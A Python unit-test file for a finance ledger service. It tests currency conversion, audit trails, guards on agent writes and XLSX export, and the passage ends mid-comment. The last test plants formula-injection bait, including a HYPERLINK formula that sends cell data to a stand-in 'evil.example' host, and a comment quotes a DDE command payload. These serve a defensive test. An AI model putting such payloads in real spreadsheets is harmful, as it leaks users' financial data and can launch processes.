"""
[INPUT]: 依赖临时 finance Ledger 与财务领域纯函数/服务。
[OUTPUT]: 锁定 P2 的汇率反转、跨币种聚合与转账换算、周期月末锚点、预算双键、习惯权重、
          XLSX 负债口径与出网前的公式钉死、附件路径迁移、护栏（含 category 形状错位）、
          完整账目版本、审计快照与单币种/周期暂停的 MVP 服务端闸。
[POS]: finance 领域回归；不启动 HTTP、不创建 time 数据库，也不触碰生产 runtime。
[PROTOCOL]: 变更时更新此头部，然后检查 CLAUDE.md
"""

from __future__ import annotations

import io
import tempfile
import unittest
from calendar import monthrange
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo
from unittest.mock import patch
from pathlib import Path

from core.errors import DomainError
from core.clock import configure_record_timezone
from core.sqlite import Ledger
from domains.finance.currency import convert_to_base_currency
from domains.finance.recurring import advance_due_date, normalize_recurring_payload
from domains.finance import service


class FinanceDomainTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory(); root = Path(self.temp.name)
        self.ledger = Ledger("finance", root / "finance.sqlite3", root / "audit"); service.ensure_schema(self.ledger)

    def tearDown(self) -> None: self.temp.cleanup()

    def transaction(self, **overrides: object) -> dict:
        payload = {"title":"午饭","amount":25,"kind":"expense","accountName":"微信支付","category":{"name":"餐饮"},"source":"manual"}; payload.update(overrides)
        return service.create_transaction(self.ledger, payload)

    def add_account(self, **fields: object) -> None:
        """走真实的 PUT /v1/fin/configuration 语义新增一个账户。"""
        configuration = service.configuration(self.ledger)
        configuration["accounts"].append({"type": "debitCard", "currency": "CNY", "openingBalance": 0.0,
                                          "ownership": "personal", "classification": "asset", **fields})
        service.update_configuration(self.ledger, configuration)

    def set_rates(self, **rates: float) -> None:
        configuration = service.configuration(self.ledger)
        configuration["settings"]["exchangeRates"] = {"baseCurrency": "CNY", "rates": {"CNY": 1.0, **rates}}
        service.update_configuration(self.ledger, configuration)

    def balances(self) -> dict:
        return {item["name"]: item["currentBalance"] for item in service.configuration(self.ledger)["accounts"]}

    def test_occurred_at_is_stamped_in_the_record_timezone_not_utc(self) -> None:
        """账务时刻是用户墙钟，不是机器 UTC —— 两者指向同一瞬间，读出来却差一个时区。

        真实事故：记录时区 Asia/Shanghai、宿主 America/Los_Angeles 的机器上，
        北京 19:43 买的奶茶落库成 11:43+00:00，面板按字符串切片渲染就显示 11:43；
        北京 00:00–08:00 记的账日期还会退到前一天，跨月直接记错月份。
        时间域一直用 record_timezone 是对的，财务域用 utc_now_iso 是错的，两本账本日界因此脱钩。
        """
        configure_record_timezone("Asia/Shanghai")
        self.addCleanup(configure_record_timezone, "UTC")

        created = self.transaction(title="蜜雪冰城")
        occurred = datetime.fromisoformat(created["occurredAt"])
        machine = datetime.fromisoformat(created["createdAt"])

        # 墙钟分量必须是北京时间，偏移必须是 +08:00
        self.assertEqual(occurred.utcoffset(), timedelta(hours=8))
        # 同一瞬间：改的是表达方式，不是时刻本身
        self.assertEqual(occurred.replace(microsecond=0), machine.astimezone(occurred.tzinfo).replace(microsecond=0))
        # created_at 仍是机器时刻，保持 UTC —— 审计不该随用户时区漂移
        self.assertEqual(machine.utcoffset(), timedelta(0))
        # 日归属按北京算：UTC 与北京跨日的那 8 小时里，月度汇总不能落到前一个月
        self.assertEqual(created["occurredAt"][:10], datetime.now(ZoneInfo("Asia/Shanghai")).date().isoformat())

    def test_transaction_revisions_preserve_complete_before_and_after_versions(self) -> None:
        created = self.transaction(title="原始午饭", amount=25, source="openClaw")
        updated = service.update_transaction(self.ledger, created["id"], {"title": "更正午饭", "amount": 28})
        service.delete_transaction(self.ledger, created["id"], actor="agent", reason="用户确认记错")

        revisions = [item for item in service.audit_events(self.ledger, 20) if item["entityId"] == created["id"]]
        self.assertEqual([item["action"] for item in reversed(revisions)], ["create", "update", "delete"])
        update = next(item for item in revisions if item["action"] == "update")
        deletion = next(item for item in revisions if item["action"] == "delete")
        self.assertEqual((update["payload"]["before"]["title"], update["payload"]["after"]["title"]), ("原始午饭", "更正午饭"))
        self.assertEqual((update["payload"]["before"]["amount"], update["payload"]["after"]["amount"]), (25.0, 28.0))
        self.assertEqual(deletion["payload"]["reason"], "用户确认记错")
        self.assertIsNotNone(deletion["payload"]["after"]["deletedAt"])
        self.assertEqual(len(list((self.ledger.audit_root / "snapshots").glob("*.sqlite3"))), 3)

    @patch("domains.finance.service.MVP_SINGLE_CURRENCY", False)
    def test_editing_amount_keeps_the_recorded_rate_and_switching_currency_recomputes(self) -> None:
        """本位币快照必须跟着金额与币种走，且改金额时不能用今天的汇率改写历史。

        此前 update 把库里的旧快照当成调用方的显式值原样返回，换算分支永远不可达：
        一笔 100 USD / 720 CNY 的账改成 200 USD 后本位币仍是 720；
        改成 CNY 50 元后仍带着 720——同一行的 currency/amount/base 三者互相矛盾。
        面板 LedgerPage/OverviewPage/TransactionDrawer 的收支合计优先取这个字段，因此直接显示错数。
        """
        configuration = service.configuration(self.ledger)
        configuration["settings"]["exchangeRates"] = {"baseCurrency": "CNY", "rates": {"USD": 7.2}}
        service.update_configuration(self.ledger, configuration)

        created = self.transaction(title="美元订阅", amount=100, currency="USD")
        self.assertEqual(created["amountInBaseCurrency"], 720.0)

        # 汇率随后变了。只改金额时必须沿用记账当时的 7.2，而不是拿现在的 8.0 改写历史——
        # 汇率不变时「缩放」与「重算」结果相同，只有让汇率动起来才分辨得出这两种实现。
        configuration = service.configuration(self.ledger)
        configuration["settings"]["exchangeRates"] = {"baseCurrency": "CNY", "rates": {"USD": 8.0}}
        service.update_configuration(self.ledger, configuration)

        doubled = service.update_transaction(self.ledger, created["id"], {"amount": 200})
        self.assertEqual(doubled["amountInBaseCurrency"], 1440.0)
        halved = service.update_transaction(self.ledger, created["id"], {"amount": 50})
        self.assertEqual(halved["amountInBaseCurrency"], 360.0)

        # 只改标题：金额与币种都没动，快照必须原样保留
        renamed = service.update_transaction(self.ledger, created["id"], {"title": "改个名"})
        self.assertEqual(renamed["amountInBaseCurrency"], 360.0)

        # 改币种：新币种在那一天的汇率不在账本里，只能按当前汇率重算
        switched = service.update_transaction(self.ledger, created["id"], {"currency": "CNY"})
        self.assertEqual((switched["currency"], switched["amount"], switched["amountInBaseCurrency"]), ("CNY", 50.0, 50.0))

    def test_duplicate_account_names_are_refused_on_every_write_path(self) -> None:
        """同名账户一律拒绝——余额按名字聚合，重名会让净资产凭空翻倍。

        views.current_balance_for_account 以 account_name 匹配流水，
        两条同名账户各自算出同一笔钱；reports 对账户列表求和，净资产直接 ×2，
        而流水里查不到任何对应的那一笔。改名撞车更隐蔽：账户数量不变，
        用户只是「改了个名字」，净资产就翻倍。
        此前财务侧唯一的冲突判据是「主数据 ID 已存在」，名字从不查重（时间域一直查）。
        """
        self.transaction(title="工资", amount=10000, kind="income", accountName="微信支付")
        before = service.reports(self.ledger, "dashboard", {})["dashboard"]["kpis"]["currentCashFlow"]["value"]
        self.assertEqual(before, 10000.0)

        confirmation = {"userConfirmation": "用户已确认"}

        # ① agent 新建同名
        with self.assertRaises(DomainError) as created:
            service.agent_operation(self.ledger, {
                "entityType": "account", "action": "create",
                "data": {"name": "微信支付"}, **confirmation,
            })
        self.assertEqual(created.exception.code, "duplicate_master_name")

        # ② agent 改名撞车：把支付宝改成微信支付
        configuration = service.configuration(self.ledger)
        alipay = next(item for item in configuration["accounts"] if item["name"] == "支付宝")
        with self.assertRaises(DomainError) as renamed:
            service.agent_operation(self.ledger, {
                "entityType": "account", "action": "update", "id": alipay["id"],
                "data": {"name": "微信支付"}, **confirmation,
            })
        self.assertEqual(renamed.exception.code, "duplicate_master_name")

        # ③ 面板 PUT：整表重写里夹带同名
        configuration = service.configuration(self.ledger)
        for item in configuration["accounts"]:
            if item["name"] == "支付宝":
                item["name"] = "微信支付"
        with self.assertRaises(DomainError) as saved:
            service.update_configuration(self.ledger, configuration)
        self.assertEqual(saved.exception.code, "duplicate_master_name")

        # 三条路径都被挡下，净资产纹丝不动
        after = service.reports(self.ledger, "dashboard", {})["dashboard"]["kpis"]["currentCashFlow"]["value"]
        self.assertEqual(after, before)

    def test_stated_account_name_wins_over_the_stale_direction_column(self) -> None:
        """只传 accountName 的部分更新必须真的改账户，不能被库里旧方向字段顶掉。

        事故：更新一笔支出时 from_account_name 取库里旧值（真值），
        expense 分支 `from_account or account` 让旧值胜出，accountName 静默无效——
        而 finctl 退出码 0、display 渲染成「↻ 已更正」，
        fin-bookkeeping.md 又要求 Agent 逐字原样输出 display，
        于是一次完全没生效的写入被逐字回报成成功。
        """
        expense = self.transaction(title="午饭", accountName="微信支付")
        self.assertEqual((expense["accountName"], expense["fromAccountName"]), ("微信支付", "微信支付"))
        moved = service.update_transaction(self.ledger, expense["id"], {"accountName": "支付宝"})
        self.assertEqual((moved["accountName"], moved["fromAccountName"]), ("支付宝", "支付宝"))

        income = self.transaction(title="工资", kind="income", accountName="微信支付")
        self.assertEqual((income["accountName"], income["toAccountName"]), ("微信支付", "微信支付"))
        landed = service.update_transaction(self.ledger, income["id"], {"accountName": "工资卡"})
        self.assertEqual((landed["accountName"], landed["toAccountName"]), ("工资卡", "工资卡"))

        # 显式方向字段仍然最优先：同时给两者时以方向字段为准
        both = service.update_transaction(self.ledger, expense["id"], {"accountName": "工资卡", "fromAccountName": "微信支付"})
        self.assertEqual((both["accountName"], both["fromAccountName"]), ("微信支付", "微信支付"))

    def test_import_commit_is_not_a_hole_around_amount_and_agent_guards(self) -> None:
        """import/commit 曾是全仓唯一不校验金额、也不过 AI 引用护栏的写路径。

        负数落库会让「账户余额推导 == 流水之和」的恒等关系破裂；
        inf 更狠——dashboard 直接 500，transactions/summary/configuration 吐出裸 Infinity
        （不是合法 JSON），面板 response.json().catch(() => null) 把 200 静默变成 null，
        整个财务区无法自救，只能下沉到 sqlite 手术。
        同一载荷走 POST /v1/fin/transactions 一直是 400 invalid_amount。
        """
        for bad in (-500, float("inf"), float("nan")):
            with self.subTest(amount=bad):
                result = service.import_commit(self.ledger, {"transactions": [
                    {"title": "坏账", "amount": bad, "kind": "expense", "accountName": "微信支付", "source": "manual"},
                ]})
                self.assertEqual((result["imported"], result["failed"]), (0, 1), result)
                self.assertIn("amount", result["errors"][0]["error"])

        # AI 来源混进导入路径，仍要过主数据护栏
        smuggled = service.import_commit(self.ledger, {"transactions": [
            {"title": "偷渡", "amount": 300, "kind": "expense",
             "accountName": "根本不存在的账户", "source": "openClaw"},
        ]})
        self.assertEqual((smuggled["imported"], smuggled["failed"]), (0, 1), smuggled)

        # 真实银行账单（source=import）保留原有豁免：未知账户先落库，再由用户归并
        genuine = service.import_commit(self.ledger, {"transactions": [
            {"title": "银行流水", "amount": 88, "kind": "expense",
             "accountName": "尚未建好的账户", "source": "import"},
        ]})
        self.assertEqual((genuine["imported"], genuine["failed"]), (1, 0), genuine)

    def test_configuration_write_cannot_wipe_master_data_without_a_trace(self) -> None:
        """整表重写必须留底，且不许把主数据清空。

        PUT /v1/fin/configuration 会 DELETE FROM accounts/categories 后原样重灌，
        空数组一次就能把全部主数据**物理**抹掉（不是软删）：此后 Agent 记任何一笔都
        422 unknown_master_data，账本只能读不能写。
        而此前审计事件的 impact 只有新状态的条数、payload 只有 {renames, adjustments}，
        没有任何被销毁内容；checkpoint 又在 commit 之后跑，存下来的是毁后状态——
        主数据无从复原。
        """
        configuration = service.configuration(self.ledger)
        account_names = {item["name"] for item in configuration["accounts"]}
        self.assertGreater(len(account_names), 0)

        # ① 清空必须被拒，且账本不受影响
        for key, code in (("accounts", "configuration_would_wipe_accounts"),
                          ("categories", "configuration_would_wipe_categories")):
            with self.subTest(key=key):
                wiped = service.configuration(self.ledger)
                wiped[key] = []
                with self.assertRaises(DomainError) as caught:
                    service.update_configuration(self.ledger, wiped)
                self.assertEqual(caught.exception.code, code)
        self.assertEqual({item["name"] for item in service.configuration(self.ledger)["accounts"]}, account_names)

        # ② 正常保存必须在审计链上留下被替换掉的原主数据
        saved = service.configuration(self.ledger)
        saved["accounts"][0]["note"] = "改一个无关字段"
        service.update_configuration(self.ledger, saved)

        events = service.audit_events(self.ledger, 20)
        latest = next(item for item in events if item["entityType"] == "configuration")
        before = latest["payload"]["before"]
        self.assertEqual({item["name"] for item in before["accounts"]}, account_names)
        self.assertGreater(len(before["categories"]), 0)

    def test_an_expense_cannot_be_re_settled_by_a_second_income(self) -> None:
        """已被 A 核销的支出不得改挂到 B——否则 A 的核销事实无声消失。

        settle 的排除集只有 (None, "", "notApplicable")，reimbursed 不在其中，
        于是第二次核销既不报 invalid 也不告警，只是把 reimbursed_by 从 A 改写成 B。
        随后删除 B，revert_for_deleted_income_in_connection 按 reimbursed_by 匹配，
        把这笔**已由 A 报销到账**的支出退回 draft，待回款凭空长回来。
        """
        expense = self.transaction(title="垫付", amount=500, reimbursementStatus="draft")
        first = self.transaction(title="回款A", amount=500, kind="income", category={"name": "工资"})
        second = self.transaction(title="回款B", amount=500, kind="income", category={"name": "工资"})

        settled = service.settle_reimbursement(self.ledger, {"incomeId": first["id"], "settleIds": [expense["id"]]})
        self.assertEqual((settled["settled"], settled["invalid"]), (1, []))

        # 同一笔回款重复提交是幂等重试，仍应放行
        again = service.settle_reimbursement(self.ledger, {"incomeId": first["id"], "settleIds": [expense["id"]]})
        self.assertEqual((again["settled"], again["invalid"]), (1, []))

        # 换一笔回款来核销同一支出：必须被拒并归入 invalid，账本不许改挂
        hijack = service.settle_reimbursement(self.ledger, {"incomeId": second["id"], "settleIds": [expense["id"]]})
        self.assertEqual((hijack["settled"], hijack["invalid"]), (0, [expense["id"]]))

        connection = self.ledger.connect()
        try:
            owner = connection.execute("SELECT reimbursed_by FROM transactions WHERE id=?", (expense["id"],)).fetchone()[0]
        finally:
            connection.close()
        self.assertEqual(owner, first["id"])

        # 删掉 B 不该动这笔已由 A 报销的支出
        service.delete_transaction(self.ledger, second["id"], reason="撤销 B")
        after = next(item for item in service.list_transactions(self.ledger, {}) if item["id"] == expense["id"])
        self.assertEqual(after["reimbursementStatus"], "reimbursed")

    def test_clearing_reimbursement_status_also_drops_the_owner(self) -> None:
        """状态离开 reimbursed 时必须一并清掉 reimbursed_by。

        该列不在 TRANSACTION_COLUMNS 里，常规更新碰不到它：把状态改成 notApplicable 后
        它仍指向原来那笔回款，随后删除该回款时，用户明确声明「与报销无关」的支出
        被强行翻回 draft，待回款从 0 变回 500，且没有任何操作痕迹解释它为什么回来。
        """
        expense = self.transaction(title="垫付", amount=500, reimbursementStatus="draft")
        income = self.transaction(title="回款", amount=500, kind="income", category={"name": "工资"})
        service.settle_reimbursement(self.ledger, {"incomeId": income["id"], "settleIds": [expense["id"]]})

        service.update_transaction(self.ledger, expense["id"], {"reimbursementStatus": "notApplicable"})
        connection = self.ledger.connect()
        try:
            owner = connection.execute("SELECT reimbursed_by FROM transactions WHERE id=?", (expense["id"],)).fetchone()[0]
        finally:
            connection.close()
        self.assertIsNone(owner)

        service.delete_transaction(self.ledger, income["id"], reason="撤销回款")
        after = next(item for item in service.list_transactions(self.ledger, {}) if item["id"] == expense["id"])
        self.assertEqual(after["reimbursementStatus"], "notApplicable")
        self.assertEqual(service.reports(self.ledger, "summary", {})["pendingReimbursement"], 0)

    def test_month_end_anchor_follows_the_only_control_the_panel_offers(self) -> None:
        """锚点必须跟着 nextDueAt 走——那是面板上唯一能表达「几号」的字段。

        面板 settings/recurring.tsx 没有 dayOfPeriod 控件，add() 把 nextDueAt 硬编码成今天，
        updateRule 又一律回传 {...rule, ...patch}（把库里的旧 dayOfPeriod 原样送回）。
        若让显式 dayOfPeriod 优先，用户把「下次触发」改成月末也改不动锚点：
        误差从基线的 1–2 天放大到近一个月，而且界面上无从纠正——
        锚点会变成写一次就再也够不着的隐藏状态。
        """
        # ① 面板新增：nextDueAt = 今天（8/3），锚点随之为 3
        created = normalize_recurring_payload(
            {"name": "房租", "frequency": "monthly", "intervalN": 1, "nextDueAt": "2026-08-03"},
            today="2026-08-03",
        )
        self.assertEqual(created["day_of_period"], 3)

        # ② 用户把「下次触发」改成 1/31 —— 面板同时把旧 dayOfPeriod=3 原样回传
        edited = normalize_recurring_payload(
            {"name": "房租", "frequency": "monthly", "intervalN": 1,
             "nextDueAt": "2024-01-31", "dayOfPeriod": created["day_of_period"]},
            today="2026-08-03",
        )
        self.assertEqual(edited["day_of_period"], 31, "nextDueAt 必须压过面板回传的旧锚点")

        # ③ 从这个锚点推进，跨过二月后必须回到月末，而不是永久停在 28/29
        cursor, seen = edited["next_due_at"], []
        for _ in range(6):
            cursor = advance_due_date(cursor, "monthly", 1, edited["day_of_period"])
            seen.append(cursor)
        self.assertEqual(seen, ["2024-02-29", "2024-03-31", "2024-04-30", "2024-05-31", "2024-06-30", "2024-07-31"])

        # ④ 不给 nextDueAt 时，显式 dayOfPeriod 仍然有效（API 调用方要锚点≠首次触发日的出口）
        explicit = normalize_recurring_payload(
            {"name": "还贷", "frequency": "monthly", "intervalN": 1, "dayOfPeriod": 15},
            today="2026-08-03",
        )
        self.assertEqual(explicit["day_of_period"], 15)

    @patch("domains.finance.service.MVP_SINGLE_CURRENCY", False)
    def test_export_and_panel_never_disagree_across_currencies_or_shapes(self) -> None:
        """XLSX 导出与面板真源必须给出同一个数——导出是给人拿去核账的。

        三处残留：账户汇总的流入流出裸加原币（跨币种转账两端都记 1000，
        期末余额与面板打架）；月度与分类汇总同样裸加；category 形状兜底
        各写各的（一条 manual 脏行就能让导出与报告口径分叉）。
        """
        try:
            import openpyxl  # noqa: F401
        except ImportError:
            self.skipTest("未安装 openpyxl，导出正例需要真依赖")

        configuration = service.configuration(self.ledger)
        configuration["settings"]["exchangeRates"] = {"baseCurrency": "CNY", "rates": {"USD": 7.2}}
        for account in configuration["accounts"]:
            if account["name"] == "微信支付":
                account["currency"] = "USD"
        service.update_configuration(self.ledger, configuration)

        # 跨币种转账：美元账户出 1000 USD，人民币账户应收 7200 CNY
        self.transaction(title="换汇", amount=1000, kind="transfer",
                         accountName="微信支付", fromAccountName="微信支付", toAccountName="工资卡")
        # 形状错位的脏行：category 是裸字符串，导出不得因此崩或写出 "None"
        self.transaction(title="脏行", amount=100, category="裸字符串分类")

        workbook_bytes = service.export_xlsx(self.ledger, {})
        import io
        from openpyxl import load_workbook
        book = load_workbook(io.BytesIO(workbook_bytes))
        rows = {row[0]: row for row in book["账户汇总"].iter_rows(min_row=2, values_only=True)}

        # 导出的期末余额必须与面板真源逐值相同
        connection = self.ledger.connect()
        try:
            for account in service.configuration(self.ledger)["accounts"]:
                if account.get("deletedAt") or account["name"] not in rows:
                    continue
                exported = rows[account["name"]][6]
                self.assertAlmostEqual(exported, account["currentBalance"], places=2,
                                       msg=f"{account['name']} 导出期末余额与面板不一致")
        finally:
            connection.close()

        # 裸字符串分类不得崩、不得写成 None
        names = {row[0] for row in book["分类汇总"].iter_rows(min_row=2, values_only=True)}
        self.assertNotIn(None, names)
        self.assertIn("裸字符串分类", names)

    def test_current_month_follows_the_record_timezone_not_the_host(self) -> None:
        """「本月」是用户的月，不是宿主机器的月。

        记录时区 Asia/Shanghai、宿主 America/Los_Angeles（用户机器就是这个组合）时，
        北京每月 1 号 0–8 点宿主还停在上个月：本月汇总、预算进度与 12 个月趋势
        会整块查到上个月，而用户刚记的这个月的账一笔都不在里面。
        这是 P11 修财务时区时漏掉的同一类问题——那次只改了 occurredAt 的写入侧。
        """
        configure_record_timezone("Asia/Shanghai")
        self.addCleanup(configure_record_timezone, "UTC")

        # 北京 8/1 凌晨 3 点：宿主 LA 还是 7/31 中午
        beijing_early_august = datetime(2026, 8, 1, 3, 0, tzinfo=ZoneInfo("Asia/Shanghai"))
        host_view = beijing_early_august.astimezone(ZoneInfo("America/Los_Angeles"))
        self.assertEqual(host_view.strftime("%Y-%m"), "2026-07", "前提：该瞬间宿主确实还在上个月")

        class FrozenDatetime(datetime):
            """冻结同一个瞬间，并如实模拟「宿主是 LA」。

            真实 datetime.now() 返回的是**宿主墙钟的 naive 值**（此刻是 LA 的 7/31 12:00），
            随后 .astimezone() 把它当本地时间补上 LA 偏移。第一版这里返回北京墙钟，
            于是 .astimezone() 也算出 8 月——测试压根没模拟出「宿主落后一个月」这一步，
            把 _month 改回宿主时区照样绿。假时钟必须比被测代码更诚实，否则它锁不住任何东西。
            """
            @classmethod
            def now(cls, tz=None):
                if tz is not None:
                    return beijing_early_august.astimezone(tz)
                return beijing_early_august.astimezone(ZoneInfo("America/Los_Angeles")).replace(tzinfo=None)

        with patch("domains.finance.reports.datetime", FrozenDatetime):
            summary = service.reports(self.ledger, "summary", {})
            budget = service.reports(self.ledger, "budget", {})
        self.assertEqual(summary["month"], "2026-08", "本月汇总落到了宿主的月份")
        self.assertEqual(budget["month"], "2026-08", "预算进度落到了宿主的月份")

    def test_advance_due_date_month_end_and_exchange_snapshot_algorithm(self) -> None:
        self.assertEqual(advance_due_date("2024-01-31", "monthly", 1), "2024-02-29")
        self.assertEqual(advance_due_date("2024-02-29", "yearly", 1), "2025-02-28")
        self.assertEqual(convert_to_base_currency(10, "USD", "CNY", {"USD": 7.2}), 72)

    @patch("domains.finance.service.MVP_SINGLE_CURRENCY", False)
    def test_cross_currency_totals_settle_in_the_base_currency(self) -> None:
        """跨账户的每一个合计都必须按本位币结算，不能把两种货币的数字裸加。

        服务端在每一次写入时已经算好并冻结了 amount_in_base_currency（记账当天的汇率），
        但月度汇总、dashboard 的 12 个月趋势和净资产三处谁都没用它，一律 sum(item["amount"])。
        于是多币种账本里「1000 元 + 1000 美元」得 2000，真值是 8200；
        currentCashFlow 还带着 ¥ 符号把两种货币当同一种展示。
        Agent 按 summary 向用户汇报「本月收入」，报出来的就是这个错数。
        """
        self.add_account(id="account-usd", name="美元账户", currency="USD")
        self.set_rates(USD=7.2)

        self.transaction(title="人民币工资", amount=1000, kind="income", accountName="工资卡", category={"name": "工资"})
        usd = self.transaction(title="美元工资", amount=1000, kind="income", accountName="美元账户", category={"name": "工资"})
        # 写入面本来就是对的：这一笔的本位币快照是 7200，只是聚合面从不看它
        self.assertEqual((usd["currency"], usd["amountInBaseCurrency"]), ("USD", 7200.0))

        summary = service.reports(self.ledger, "summary", {})
        self.assertEqual(summary["income"], 8200.0)
        self.assertEqual(summary["balance"], 8200.0)

        overview = service.reports(self.ledger, "dashboard", {})["dashboard"]
        self.assertEqual(overview["trendData"]["income"][-1], 8200.0)
        self.assertEqual(overview["kpis"]["currentCashFlow"]["value"], 8200.0)
        self.assertEqual(overview["kpis"]["currentCashFlow"]["display"], "¥8,200")

        # 账户自己的余额仍是账户自己的币种——单账户内按原币累加本来就是对的，不该被换算
        self.assertEqual(self.balances()["美元账户"], 1000.0)

    @patch("domains.finance.service.MVP_SINGLE_CURRENCY", False)
    def test_cross_currency_transfer_converts_the_receiving_leg(self) -> None:
        """一笔转账两个账户、两种货币，而交易行只有一个 amount。

        1000 USD 从美元账户转进人民币账户：美元账户扣 1000 USD 是对的，
        人民币账户此前也只加 1000 元（应为 7200），净资产凭空蒸发 6200，
        服务端不报错、不提示，用户只会看到「钱少了」却查不出哪一笔。
        判据用守恒律写：换汇不改变净资产，只改变它停在哪个账户里。
        """
        self.add_account(id="account-usd", name="美元账户", currency="USD")
        self.set_rates(USD=7.2)
        self.transaction(title="美元本金", amount=5000, kind="income", accountName="美元账户", category={"name": "工资"})

        before = service.reports(self.ledger, "dashboard", {})["dashboard"]["kpis"]["currentCashFlow"]["value"]
        self.assertEqual(before, 36000.0)

        self.transaction(title="换汇", amount=1000, kind="transfer", accountName="美元账户",
                         fromAccountName="美元账户", toAccountName="工资卡", category={"name": "转账"})

        balances = self.balances()
        self.assertEqual(balances["美元账户"], 4000.0)   # 美元账户仍以美元计
        self.assertEqual(balances["工资卡"], 7200.0)     # 收款端按到账当时的汇率入账
        after = service.reports(self.ledger, "dashboard", {})["dashboard"]["kpis"]["currentCashFlow"]["value"]
        self.assertEqual(after, before)

        # 同币种转账不经换算，原样搬运（换算若误伤同币种，这里会因舍入或汇率缺失而漂移）
        self.transaction(title="内部调拨", amount=123.45, kind="transfer", accountName="工资卡",
                         fromAccountName="工资卡", toAccountName="微信支付", category={"name": "转账"})
        balances = self.balances()
        self.assertEqual((balances["工资卡"], balances["微信支付"]), (7076.55, 123.45))

    @patch("domains.finance.service.MVP_RECURRING_PAUSED", False)
    def test_month_end_anchor_survives_february(self) -> None:
        """月末锚点是规则的属性，不是游标的属性。

        1/31 的月度规则跨过一次二月后，游标停在 2/29；此前 advance_due_date 拿游标的
        「几号」当锚点，于是 3 月生成 29 号、4 月 29 号……永久提前 2–3 天出账，全程无告警。
        房租、房贷这类月末固定支出会因此每年少记一次月末、多记一批错日期。
        day_of_period 这一列一直存在却从没人写也没人读——锚点必须固化在规则里。
        """
        template = {"title": "房租", "amount": 3000, "kind": "expense",
                    "accountName": "工资卡", "category": {"name": "住房"}}
        rule = service.recurring(self.ledger, "create", None,
                                 {"name": "房租", "frequency": "monthly", "template": template,
                                  "nextDueAt": "2099-01-31"})
        self.assertEqual(rule["dayOfPeriod"], 31)  # 建规则时锚点就被固化

        # 把游标退回 2024-01-31，让它一路补齐——多步推进才分辨得出锚点是否被 clamp 吃掉
        service.recurring(self.ledger, "update", rule["id"],
                          {"name": "房租", "frequency": "monthly", "template": template,
                           "nextDueAt": "2024-01-31"})
        dates = sorted(item["occurredAt"][:10] for item in service.list_transactions(self.ledger, {})
                       if "周期账目" in item["tags"])
        self.assertEqual(dates[:6], ["2024-01-31", "2024-02-29", "2024-03-31",
                                     "2024-04-30", "2024-05-31", "2024-06-30"])
        for value in dates:
            moment = datetime.fromisoformat(value)
            self.assertEqual(moment.day, monthrange(moment.year, moment.month)[1], f"{value} 不是当月最后一天")

        # yearly 的闰日锚点同理：退到 2/28 之后必须还能在下一个闰年回到 2/29
        cursor = "2024-02-29"
        for _ in range(4):
            cursor = advance_due_date(cursor, "yearly", 1, 29)
        self.assertEqual(cursor, "2028-02-29")

    def test_xlsx_account_summary_uses_the_liability_balance_convention(self) -> None:
        """导出的期末余额必须与账本口径同源，负债账户尤其不能套资产公式。

        「账户汇总」表的期初列取 openingBalance（负债口径：正数 = 欠款），
        期末列却一直写成 期初 + 流入 − 流出。信用卡刷卡记在「流出」，于是刷得越多
        算出来的欠款越少——用户拿这份 XLSX 核对信用卡账单，欠款少算两倍刷卡额。
        """
        self.add_account(id="account-credit", name="信用卡", type="creditCard",
                         classification="liability", openingBalance=1000.0, creditLimit=50000)
        self.transaction(title="刷卡买菜", amount=500, accountName="信用卡", category={"name": "购物"})
        self.transaction(title="还款", amount=300, kind="transfer", accountName="工资卡",
                         fromAccountName="工资卡", toAccountName="信用卡", category={"name": "转账"})
        self.transaction(title="工资", amount=9000, kind="income", accountName="工资卡", category={"name": "工资"})

        from openpyxl import load_workbook
        sheet = load_workbook(io.BytesIO(service.export_xlsx(self.ledger, {})))["账户汇总"]
        exported = {row[0]: row[6] for row in sheet.iter_rows(min_row=2, values_only=True)}

        self.assertEqual(exported["信用卡"], 1200.0)  # 1000 欠款 + 500 刷卡 − 300 还款
        # 逐账户与真源口径对齐：导出与面板给出两个不同的余额，比给出一个错的更危险
        self.assertEqual(exported, {name: round(value, 2) for name, value in self.balances().items()})

    def test_xlsx_export_never_hands_the_spreadsheet_a_live_formula(self) -> None:
        """导出的字符串单元格必须是文本，不能是活公式。

        攻击链已复现，且不需要攻击者拿到本机任何权限：微信/支付宝账单里的
        「交易对方」与「备注」是**任何陌生人给你转账时都能填**的字段，
        账单导入 → 落库 → GET /v1/fin/export/xlsx，「明细」表标题列与商户列的 data_type 就是 'f'。
        用户把报税表转给会计，会计点一下 =HYPERLINK("http://evil/?x="&A2,"点我看发票")
        就把同行金额送去攻击者域名；老 Excel 的 =cmd|'/C ...'!A0 还能弹 DDE 起进程。
        钉成文本的同时不许改动用户看到的字：这份表是拿去核账和报税的，多一个引号就是错的数据。
        """
        baits = ('=HYPERLINK("http://evil.example/?x="&A2,"点我看发票")', "+1+1", "-2+3", "@SUM(A1:A9)")
        for index, bait in enumerate(baits):
            self.transaction(title=bait, merchant=bait, note=bait, amount=25 + index,
                             kind="income", accountName="工资卡", taxCategory="business-income")

        from openpyxl import load_workbook
        # 明细表 D 标题 / M 商户 / N 备注，税务表 C 标题 / F 对方·商户 / H 备注 —— 全是用户可控文本；
        # 税务表尤其要紧，那正是会被转发给会计的那一份
        details = load_workbook(io.BytesIO(service.export_xlsx(self.ledger, {})))["明细"]
        tax = load_workbook(io.BytesIO(service.export_tax_report(self.ledger, {})))["1.业务收入"]
        rows = {"明细": ({row[3].value: row for row in details.iter_rows(min_row=2)}, (3, 12, 13)),
                "1.业务收入": ({row[2].value: row for row in tax.iter_rows(min_row=2)}, (2, 5, 7))}

        for bait in baits:
            for sheet, (indexed, columns) in rows.items():
                self.assertIn(bait, indexed, f"{sheet} 里找不到 {bait!r} 这一行")
                for column in columns:
                    with self.subTest(sheet=sheet, bait=bait, column=column):
                        cell = indexed[bait][column]
                        self.assertNotEqual(cell.data_type, "f", "用户文本被写成了活公式")
                        self.assertEqual(cell.value, bait, "钉成文本不许改动用户看到的原文")
                        # quotePrefix 是第二道闸：+ - @ 开头的串 openpyxl 本就写成字符串，
                        # 但用户在 Excel 里复制或双击重编辑这一格时，它会被重新解析成公式。
                        self.assertTrue(cell.quotePrefix, "文本没有被标记为「不要当公式解析」")

        # 金额列绝不能被波及：负数是 float，不是以 '-' 开头的字符串
        amounts = [row[4] for row in details.iter_rows(min_row=2)]
        self.assertTrue(all(cell.data_type == "n" and not cell.quotePrefix for cell in amounts))

        # 说明页同样在出网面上：from/to 原样来自 query，而日期闸只查长度和两个短横的位置，
        # "-999-12-01" 能整条穿过去
